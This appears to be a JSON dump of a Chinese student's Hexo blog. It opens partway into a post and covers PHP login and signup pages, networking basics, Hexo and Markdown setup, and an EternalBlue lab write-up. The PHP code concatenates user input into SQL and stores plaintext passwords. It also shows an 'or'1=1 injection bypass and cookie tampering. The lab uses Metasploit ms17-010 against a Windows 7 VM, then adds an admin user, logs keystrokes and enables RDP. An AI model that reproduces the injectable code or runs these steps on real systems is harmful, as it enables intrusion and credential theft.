$result2-&gt;fetch_assoc()) &#123; echo &quot;&lt;div class=&#x27;ft&#x27;&gt;&quot;. $row[&quot;comment&quot;]. &quot;&lt;/div&gt;&lt;br&gt;&quot;; &#125; &#125; else &#123; echo &quot;&lt;div class=&#x27;ft&#x27;&gt;0 结果&lt;/div&gt;&quot;; &#125; ?&gt;&lt;/body&gt;&lt;/html&gt; 效果如下： 5，将上述两个功能块加入书主页面 在main.php中写入以下代码： 12345678&lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;left&quot;&gt; &lt;?php include &#x27;upload.php&#x27;; ?&gt; &lt;/div&gt; &lt;div class=&quot;right&quot;&gt; &lt;?php include &#x27;mycomments.php&#x27;; ?&gt; &lt;/div&gt; &lt;/div&gt; 效果如图所示： 6，新建signip.php和link_ip.php，编写注册页面 在link_ip.php中写入以下代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phpheader(&#x27;content-type:text/html; charset= utf-8&#x27;);session_start();$username=trim($_POST[&#x27;username&#x27;]);$password1=trim($_POST[&#x27;password1&#x27;]);$password2=trim($_POST[&#x27;password2&#x27;]);$link=new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;security&quot;); // 检查连接是否成功 if ($conn-&gt;connect_error) &#123; echo &quot;&lt;div class=&#x27;ft&#x27;&gt;数据库连接失败!&lt;/div&gt;&lt;br&gt;&quot;; &#125;else&#123; echo &quot;&lt;div class=&#x27;ft&#x27;&gt;数据库连接成功！&lt;/div&gt;&lt;br&gt;&quot;; &#125;if(isset($_POST[&#x27;login&#x27;]))&#123; echo &quot;跳转到登录页面！&quot;; header(&quot;Location: login.php&quot;); exit();&#125;else if(isset($_POST[&#x27;signup&#x27;])) &#123; if(empty($username) || empty($password1) || empty($password2))&#123; echo &quot;输入不能为空！&quot;; header(&quot;Location: signup.php&quot;); exit(); &#125;else if($password1!=$password2)&#123; echo &quot;两次输入的密码不一致&quot;; header(&quot;Location: signup.php&quot;); exit(); &#125;else&#123; echo &quot;两次输入的密码一致！&quot;; $seclect=&quot;select * from users where username=&#x27;$username&#x27; and password=&#x27;$password1&#x27; &quot;; $result=$link-&gt;query($seclect); if(($result-&gt;num_rows)&gt;0)&#123; echo &quot;该用户已存在！&quot;; header(&quot;Location: signup.php&quot;); &#125;else&#123; $sql=&quot;INSERT INTO users (username,password,isadm) VALUES (&#x27;$username&#x27;,&#x27;$password1&#x27;,0)&quot;; if ($link-&gt;query($sql) === TRUE) &#123; echo &quot;用户注册成功！&quot;; echo $sql . &quot;&lt;br&gt;&quot; ; header(&quot;Location: login.php&quot;); &#125; else &#123; echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; ; echo &quot;用户注册失败！&quot;; header(&quot;Location: signup.php&quot;); &#125; &#125; &#125;&#125;?&gt; 效果如图所示：","categories":[],"tags":[]},{"title":"九，php搭建登录页面","slug":"九，php搭建登录页面","date":"2023-11-13T09:14:32.000Z","updated":"2023-11-13T10:06:38.000Z","comments":true,"path":"2023/11/13/九，php搭建登录页面/","permalink":"http://example.com/2023/11/13/%E4%B9%9D%EF%BC%8Cphp%E6%90%AD%E5%BB%BA%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2/","excerpt":"","text":"1，在官网https://www.xp.cn/下载小皮面板PHP study 2，打开PHP study开启Apache和MySQL环境 3，点击网站项，打开网站根目录：C:\\phpStudy_64\\phpstudy_pro\\WWW 4，删除初始文件，新建index.php文件，用vscode进行编辑HTML效果为： 代码如下： 12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;白的网站&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form method=&quot;post&quot; action=&quot;link.php&quot;&gt; &lt;tr&gt; &lt;td&gt;用户名：&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/td&gt;&lt;br&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;密码：&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/td&gt;&lt;br&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;input type=&quot;checkbox&quot; name=&quot;rember&quot; value=&quot;yes&quot;&gt;记住密码&lt;/td&gt;&lt;br&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;reset&quot; name=&quot;reset&quot; value=&quot;重置&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 5，用PHP编写登录功能， 若用户名或密码的输入为空，则显示用户名或密码为空，并返回index页面 若输入的用户名和密码在数据库中没有或不对应，则显示用户名或密码不正确，并返回index页面 若输入的用户名和密码在数据库中存在且对应，则跳转到zhuye页面 代码如下： 123456789101112131415161718192021222324252627282930313233343536&lt;?phpheader(&#x27;content-type:text/html; charset= utf-8&#x27;);session_start();$username=trim($_POST[&#x27;username&#x27;]);$password=trim($_POST[&#x27;password&#x27;]);echo strlen($username);echo strlen($password);if(empty($username) || empty($password))&#123; echo &#x27;用户或密码不能为空！&#x27;; header(&quot;Location: index.php&quot;); exit;&#125;else&#123; $link=new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;security&quot;); // 检查连接是否成功 if ($conn-&gt;connect_error) &#123; echo &quot;数据库连接失败&quot;; &#125;else&#123; echo &quot;数据库连接成功！&quot;; &#125; $seclect=&quot;select * from users where username=&#x27;$username&#x27; and password=&#x27;$password&#x27; &quot;; $result=$link-&gt;query($seclect); if(($result-&gt;num_rows)&gt;0)&#123; $_SESSION[&#x27;user&#x27;]=$username; setcookie(&#x27;user&#x27;,$username,time()+7*12*60*60); echo &quot;登录成功！&quot;; header(&quot;Location: zhuye.php&quot;); exit(); &#125;else&#123; echo &#x27;账号或密码错误！&#x27;; header(&quot;Location: index.php&quot;); exit(); &#125;&#125;?&gt; 6，编写zhuye页面，先检测是否有user cookie 若存在，则显示成功，用户名和user cookie的值 若不存在，则显示失败 代码如下： 12345678910&lt;?phpheader(&#x27;content-type:text/html; charset= utf-8&#x27;);session_start();if(isset($_COOKIE[user]))&#123; echo &quot;成功&lt;br&gt;&quot;; echo &quot;用户名为：&quot;.$_SESSION[user].&quot; &lt;br&gt;&quot;; echo &quot;登录时设置的user cookie：&quot;.$_COOKIE[user];&#125;else&#123; echo &quot;失败！&quot;;&#125; 登录成功效果如下： 7，可以通过在浏览器的开发者工具和yakit中更改cookie的值来修改登录后的页面，效果如下： 8，因为sql语句”select * from users where username&#x3D;’$username’ and password&#x3D;’$password’ “;是拼接的，所以当用户名输入’or’1&#x3D;1，密码也输入’or’1&#x3D;1时会发生SQL注入也可以登录成功，效果如下：","categories":[],"tags":[]},{"title":"八，永恒之蓝漏洞利用","slug":"八，永恒之蓝漏洞利用","date":"2023-11-10T08:10:03.000Z","updated":"2023-11-10T11:02:16.000Z","comments":true,"path":"2023/11/10/八，永恒之蓝漏洞利用/","permalink":"http://example.com/2023/11/10/%E5%85%AB%EF%BC%8C%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","excerpt":"","text":"1，准备kali-linux 和windows7（未装补丁）两个虚拟机 2，确保kali-linux 和 windows7 两个虚拟机都为桥接模式 3，Kali-Linux改为以root用户登录 4，查看Windows7和kali-Linux的IP地址 5，通过ping命令，测试两台虚拟机是否能连通 6，kali-linux输入msfconsole启动msf（若不是root登陆需sudo提升权限） 。#msfconsole会启动metasploit，命令提示行显示msf则启动成功。 7，输入search ms17-010查看漏洞模块 3 auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010是永恒之蓝扫描模块，探测主机是否存在ms17-010漏洞。 0 exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue是永恒之蓝攻击代码，一般两者配合使用，前者先扫描，若是显示有漏洞，再进行攻击。 8，扫描过程 可以使用use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010或者use 3命令 9，攻击过程 可以使用use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue或者use 0命令 10，显示远程主机系统信息： sysinfo 11，通过 meterpreter 获取屏幕快照： screenshot 12，上传文件到Windows主机，并从Windows主机中下载文件 上传文件：upload kali的文件地址 Windows的保存路径 下载文件 ：download kali的保存路径 windows的文件地址 13，添加用户并到管理员组 123net user uname pass /add 添加用户名为name，密码为passnet localgroup Administrators uname /add 将用户名为uname的用户添加到管理员组net user uname /del 删除uname用户 14，键盘监听 ps 看（explorer.exe）进程号 migrate 1892（进程号） 迁移 keyscan_start 键盘监听 keyscan_dump 看键盘输入了什么 15，远程登陆目标主机 C:\\WINDOWS\\system32&gt;net user admin &#x2F;active:yes开启远程管理服务C:\\Windows\\system32&gt;reg add “HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server” &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f","categories":[],"tags":[]},{"title":"七，更改hexo博客主题","slug":"七，更改hexo博客主题","date":"2023-11-09T08:48:31.000Z","updated":"2023-11-09T08:58:56.000Z","comments":true,"path":"2023/11/09/七，更改hexo博客主题/","permalink":"http://example.com/2023/11/09/%E4%B8%83%EF%BC%8C%E6%9B%B4%E6%94%B9hexo%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98/","excerpt":"","text":"1,在hexo博客主题官网上选择一个合适的主题 2，点击跳转到该主题的GitHub网站，并找到安装操作步骤 3，在本地博客文件的根目录打开git输入安装命令 1git clone https://github.com/cofess/hexo-theme-pure.git themes/pure 4，打开站点配置文件，找到theme字段，将其值更改为 pure 1theme: pure 5，更新主题 12cd themes/puregit pull 6，进行预览 1hexo s 7,清除Hexo生成的静态文件 1hexo clean 8,部署至GitHub仓库 1hexo d -g 在浏览器中输入网址：https://baiqstar.github.io/，效果如下图所示：","categories":[],"tags":[]},{"title":"六，常见的网络拓扑结构","slug":"六，常见的网络拓扑结构","date":"2023-11-08T12:07:41.000Z","updated":"2023-11-08T12:23:32.000Z","comments":true,"path":"2023/11/08/六，常见的网络拓扑结构/","permalink":"http://example.com/2023/11/08/%E5%85%AD%EF%BC%8C%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E7%BB%93%E6%9E%84/","excerpt":"","text":"常见的网络拓扑结构有以下6种：1.总线型网络拓扑结构；2.星型网络拓扑结构；3.环形网络拓扑结构；4.树型网络拓扑结构；5.网状网络拓扑结构；6.混合网络型拓扑结构。 1.总线型网络拓扑结构​ 总线型结构是将网络中的所有设备通过相应的硬件接口直接连接到公共总线上，结点之间按广播方式通信，一个结点发出的信息，总线上的其它结点均可“收听”到。 总线型结构就像一张树叶,有一条主干线,主干线上面由很多分支。总线型拓扑结构图如下: 优点： 结构简单，可扩充性好； 当需要增加节点时，只需要在总线上增加一个分支接口便可与分支节点相连，当总线负载不允许时还可以扩充总线； 缺点： 维护难，分支节点故障查找难。 这种网络因为各节点是共用总线带宽的，所以在传输速度上会随着接入网络的用户的增多而下降； 2.星型网络拓扑结构​ 星型结构是一种以中央节点为中心，把若干外围节点连接起来的辐射式互联结构。这种结构适用于局域网，特别是近年来连接的局域网大都采用这种连接方式。这种连接方式以双绞线或同轴电缆作连接线路。星型拓扑结构图如下: 优点： 控制简单。任何一站点只和中央节点相连接，因而介质访问控制方法简单，致使访问协议也十分简单。易于网络监控和管理。 故障诊断和隔离容易。中央节点对连接线路可以逐一隔离进行故障检测和定位，单个连接点的故障只影响一个设备，不会影响全网。 3.环形网络拓扑结构​ 环形结构各结点通过通信线路组成闭合回路，环中数据只能单向传输，信息在每台设备上的延时时间是固定的，特别适合实时控制的局域网系统。环形结构就如一串珍珠项链,环形结构上的每台计算机就是项链上的一个个珠子。环形拓扑结构图如下: 特点： 信息流在网中是沿着固定方向流动的，两个节点仅有一条道路，故简化了路径选择的控制； 环路上各节点都是自主控制，故控制软件简单； 由于信息源在环路中是串行地穿过各个节点，当环中节点过多时，势必影响信息传输速率，使网络的响应时间延长； 4.树型网络拓扑结构​ 树型拓扑结构是一种层次结构，结点按层次连结，信息交换主要在上下结点之间进行，相邻结点或同层结点之间一般不进行数据交换。树型拓扑结构是就是数据结构中的树。树型拓扑结构图如下: 特点： ● 网络结构简单，便于管理；● 控制简单，建网容易；● 网络延迟时间较短，误码率较低；● 网络共享能力较差；● 通信线路利用率不高；● 中央结点负荷太重。 三层结构分为核心层，汇聚层和接入层， 接入层：无线网络发射器，AP（提供接入网络的接口）汇聚层：楼层交换机、建筑物交换机（汇聚接入层设备）核心层：核心交换机（数据高速转发） 5.网状网络拓扑结构​ 网络拓扑结构又称作无规则结构，结点之间的联结是任意的，没有规律。网状拓扑结构图如下: 特点如下：●网络可靠性高，一般通信子网中任意两个节点交换机之间，存在着两条或两条以上的通信路径，这样，当一条路径发生故障时，还可以通过另一条路径把信息送至节点交换机。●网络可组建成各种形状，采用多种通信信道，多种传输速率。●网内节点共享资源容易。●可改善线路的信息流量分配。●可选择最佳路径，传输延迟小。 6.混合网络型拓扑结构​ 混合型网络拓扑结构就是指同时使用上面的5种网络拓扑结构种两种或两种以上的网络拓扑结构。这种网络拓扑结构是由星型结构和总线型结构的网络结合在一起的网络结构，这样的拓扑结构更能满足较大网络的拓展，解决星型网络在传输距离上的局限，而同时又解决了总线型网络在连接用户数量的限制。这种网络拓扑结构同时兼顾了星型网与总线型网络的优点，在缺点方面得到了一定的弥补。 特点： 应用广泛 扩展灵活 性能差 较难维护","categories":[],"tags":[]},{"title":"五，VMware的三种网络连接模式","slug":"五，VMware的三种网络连接模式","date":"2023-11-08T11:47:27.000Z","updated":"2023-11-08T12:06:32.000Z","comments":true,"path":"2023/11/08/五，VMware的三种网络连接模式/","permalink":"http://example.com/2023/11/08/%E4%BA%94%EF%BC%8CVMware%E7%9A%84%E4%B8%89%E7%A7%8D%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"安装完成vmware以后进入虚拟机—&gt;&gt;设置—&gt;&gt;网络适配器 ​ 在网络适配器中可以发现vmware为我们提供了三种网络工作模式，它们分别是：1,Bridged（桥接模式）直接连接物理网络2,NAT（网络地址转换模式）与主机共享IP地址3,Host-Only（仅主机模式）与主机共享的专用网络 VMnet0表示的是用于桥接模式下的虚拟交换机； VMnet1表示的是用于仅主机模式下的虚拟交换机； VMnet8表示的是用于NAT模式下的虚拟交换机； Bridged（桥接模式）​ 桥接模式就是将主机网卡与虚拟机虚拟的网卡利用虚拟网桥进行通信。在桥接的作用下，类似于把物理主机虚拟为一个交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，相互可以访问而不干扰。在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致。 其网络结构如下图所示： ​ 虚拟机可以连接外网，可以和同网段的其他真实物理主机之间相互访问呢，可以和相同模式的虚拟机之间相互访问。此模式用于ip地址资源比较充足的情况缺点：​ 但如果你的网络环境是ip资源很缺少或对ip管理比较严格的话，那桥接模式就不太适用了。 NAT（地址转换模式）NAT模式借助虚拟NAT设备和虚拟DHCP服务器，使得虚拟机可以联网。其网络结构如下图所示： ​ 在NAT模式中，主机网卡直接与虚拟NAT设备相连，然后虚拟NAT设备与虚拟DHCP服务器一起连接在虚拟交换机VMnet8上，这样就实现了虚拟机联网。 ​ 此时，虚拟机可以连接外网（NAT实现），可以和相同模式的虚拟机之间相互访问（同一交换机下），但不可以和同网段的其他真实物理主机之间相互访问（不同子网，且没有第三层路由器）。此模式用于ip地址资源比较稀缺的情况。 ​ 然后，将VMware Network Adapter VMnet8启用之后，发现远程工具可以连接上虚拟机了。那么，这就是NAT模式，利用虚拟的NAT设备以及虚拟DHCP服务器来使虚拟机连接外网，而VMware Network Adapter VMnet8虚拟网卡是用来与虚拟机通信的。 Host-Only（仅主机模式）​ Host-Only模式其实就是NAT模式去除了虚拟NAT设备，然后使用VMware Network Adapter VMnet1虚拟网卡连接VMnet1虚拟交换机来与虚拟机通信的，Host-Only模式将虚拟机与外网隔开，使得虚拟机成为一个独立的系统，只与主机相互通讯。其网络结构如下图所示： ipv4地址由32为二进制数组成，每四位用空格隔开，每八位用逗号隔开 私有地址范围：A段：10.0.0.0-10.255.255.255B段：172.16.0.0-172.31.255.255C段：192.168.0.0-192.168.255.255 https://myip.ipip.net 用于查看公网IP地址 子网掩码255.255.255.0标志前24位相同的数字在同一网络下，后8位是主机号前24位是网络号","categories":[],"tags":[]},{"title":"四，markdown语法","slug":"四，markdown语法","date":"2023-11-08T11:02:10.000Z","updated":"2023-11-08T11:45:32.000Z","comments":true,"path":"2023/11/08/四，markdown语法/","permalink":"http://example.com/2023/11/08/%E5%9B%9B%EF%BC%8Cmarkdown%E8%AF%AD%E6%B3%95/","excerpt":"","text":"标题：用#来表示格式，以#的数量表示标题的大小，效果如图： 字体设置斜体、粗体、删除线： 链接：1，插入图片链接： 格式为： 2，Markdown 支持以比较简短的自动链接形式来处理网址和电子邮件信箱，只要是用&lt;&gt;包起来， Markdown 就会自动把它转成链接。也可以直接写，也是可以显示成链接形式的 分割线：可以在一行中用三个以上的星号(*)、减号(-)、底线(_)来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。 代码块：用三个~来表示格式，效果如下： 1main 引用：在被引用的文本前加上&gt;符号，以及一个空格就可以了，如果只输入了一个&gt;符号会产生一个空白的引用。 列表：1，无序列表 使用 *，+，- 表示无序列表。注意：符号后面一定要有一个空格，起到缩进的作用。 2，有序列表 使用数字和一个英文句点表示有序列表。注意：英文句点后面一定要有一个空格，起到缩进的作用。 3，无序列表和有序列表同时使用 表格： 换行：方法1: 连续两个以上空格+回车方法2：使用html语言换行标签： 缩进字符：、 特殊符号：","categories":[],"tags":[]},{"title":"三，Typora+PicGo+Github保证博客中图片显示","slug":"三，Typora-PicGo-Github保证博客中图片显示","date":"2023-11-08T03:11:38.000Z","updated":"2023-11-08T03:27:36.000Z","comments":true,"path":"2023/11/08/三，Typora-PicGo-Github保证博客中图片显示/","permalink":"http://example.com/2023/11/08/%E4%B8%89%EF%BC%8CTypora-PicGo-Github%E4%BF%9D%E8%AF%81%E5%8D%9A%E5%AE%A2%E4%B8%AD%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA/","excerpt":"","text":"为了方便写作，我们可以采用Typora+PicGo+Github的方案来搭建我们的博客写作环境。 Typora：它是一款轻便简洁的Markdown编辑器，支持即时渲染技术，即所写立刻所见，少了排版的时间，专注于文章内容的编辑。 PicGo:它是一个用于快速上传图片并获取图片 URL 链接的工具，支持多种图库。 Github:代码托管工具，除了代码，还可以用作图片存储。 在我们的博客写作中，可以达成这样的需求： 使用Markdown编辑博客 一篇博客发布多个平台 图片一次上传，处处引用 操作步骤： 安装好Typora和PicGo软件，并准备一个GitHub账号 登录Github并创建一个公开的仓库，需要注意仓库必须是公开的，否则无法预览。 设置token 点击右上角头像-settings，然后点击developer settings，点击personal access tokens。 点击tokens (classic)，点击create new token(classic) 设置权限 复制token PicGo配置Github图床 点击左边图床设置，选择GitHub图床，具体配置如下 设定仓库名，填写：GitHub名&#x2F;库名 分支，默认填main 设定Token，刚才保存的token令牌 指定存储路径，默认填img&#x2F; 自定义域名为https://cdn.jsdelivr.net/gh/你的github用户名/你的仓库名@分支（一般为main）/ 图床接入 接下来可以在 Typora中接入我们的图床了。 打开Typora，找到文件-&gt;偏好设置-&gt;图像 进行如下配置 6.上传图片 上传后图片就在GitHub中设置的仓库中的文件夹中了","categories":[],"tags":[]},{"title":"","slug":"一，利用github搭建hexo博客","date":"2023-11-08T02:37:32.000Z","updated":"2023-11-08T02:37:32.000Z","comments":true,"path":"2023/11/08/一，利用github搭建hexo博客/","permalink":"http://example.com/2023/11/08/%E4%B8%80%EF%BC%8C%E5%88%A9%E7%94%A8github%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/","excerpt":"","text":"一，利用github搭建hexo博客搭建前的准备： 提前安装好(node.js)[https://nodejs.org/en] 左边的那个 提前安装好(GIt)[https://git-scm.com/downloads] 提前注册好一个github账号 操作步骤： 在本地找个目录放博客源文件，路径不要有中文 在选定的目录中，右键Git Bash Here 使用npm命令安装Hexo，输入: 1234npm install -g hexo-cli #全局安装hexo-clihexo init blog #使用Hexo初始化一个新的博客项目名称为blogcd blog #进入blog文件夹hexo g #使用Hexo生成静态文件 回车构建好后出现如下效果图 按顺序执行以下三条命令便可查看网站雏形 123hexo new test_my_site #使用Hexo创建一个新的博客项目名称为test_my_sitehexo g #使用Hexo生成静态文件hexo s #使用Hexo启动本地服务器,可以进行网站预览 在浏览器中输入网址localhost:4000，效果图如下： 配置ssh 1cd ~/.ssh #检查本机已存在的ssh密钥 如果提示：No such file or directory 说明你是第一次使用git。 1ssh-keygen -t rsa -C “邮件地址” 然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key key填写C:\\Users\\Administrator.ssh\\id_rsa.pub中的内容，填写钥匙名并创建 尝试ssh连接,测试是否成功 1ssh -T git@github.com # 注意邮箱地址不用改 如果提示Are you sure you want to continue connecting (yes&#x2F;no)?，输入yes，然后会看到下面这个，就算成功： 1Hi liuxianan! You’ve successfully authenticated, but GitHub does not provide shell access. 在选中的位置(blog目录下)打开cmd(以管理员身份) 1npm install hexo-deployer-git –save 在上一个Git Bash Here还需要继续配置 12git config --global user.name &quot;luozhixiaowo&quot;// 你的github用户名，非昵称git config --global user.email &quot;xxx@qq.com&quot;// 填写你的github注册邮箱 准备上传代码 在github上新建一个存储库，命名为github的用户名.github.io 编辑_config.yml文件，在最后改成这样 1234deploy: type: git repository: git@github.com:luozhixiaowo/luozhixiaowo.github.io.git branch: main 注意保持格式，缩进不对，会导致一会儿，上传不成功 最后上传 12hexo d每次上传成功之后，需要等待1-3分钟，用来刷新页面 在创建的存储库的设置中-pages-如图设置 最后在浏览器中输入网址baiQstar.github.io就可访问网站了 总结： 注意英文输入，命令含中文符号会报错 在设置用户名和邮箱时注意将—改为– 注意在blog文件夹中进行操作","categories":[],"tags":[]},{"title":"图片猫","slug":"图片猫","date":"2023-11-07T12:44:22.000Z","updated":"2023-11-08T02:31:58.000Z","comments":true,"path":"2023/11/07/图片猫/","permalink":"http://example.com/2023/11/07/%E5%9B%BE%E7%89%87%E7%8C%AB/","excerpt":"","text":"mao","categories":[],"tags":[]},{"title":"二，发布新增文章到博客","slug":"二，发布新增文章到博客","date":"2023-11-07T12:20:49.000Z","updated":"2023-11-07T12:28:06.000Z","comments":true,"path":"2023/11/07/二，发布新增文章到博客/","permalink":"http://example.com/2023/11/07/%E4%BA%8C%EF%BC%8C%E5%8F%91%E5%B8%83%E6%96%B0%E5%A2%9E%E6%96%87%E7%AB%A0%E5%88%B0%E5%8D%9A%E5%AE%A2/","excerpt":"","text":"1，安装扩展： 1npm i hexo-deployer-git 2，新建文章： 1hexo new post &quot;我的第一篇博客&quot; 执行后会在C:\\MyBlog\\blog\\source_posts中新增一个文件夹和一个.md文件 一个用来存放你的图片等数据，另一个就是你的文章文件啦。 3，编写markdown文件 4，生成静态网页 1hexo g 5,查看本地预览效果 1hexo s 6,上传到github上 1hexo d 注意： 本地仓库在C:\\MyBlog\\blog\\public中 需要删除文件的话要先将本地文件删除后在上传同步一次GitHub","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2023-11-07T07:22:14.000Z","updated":"2023-11-07T07:22:14.000Z","comments":true,"path":"2023/11/07/hello-world/","permalink":"http://example.com/2023/11/07/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[],"tags":[]}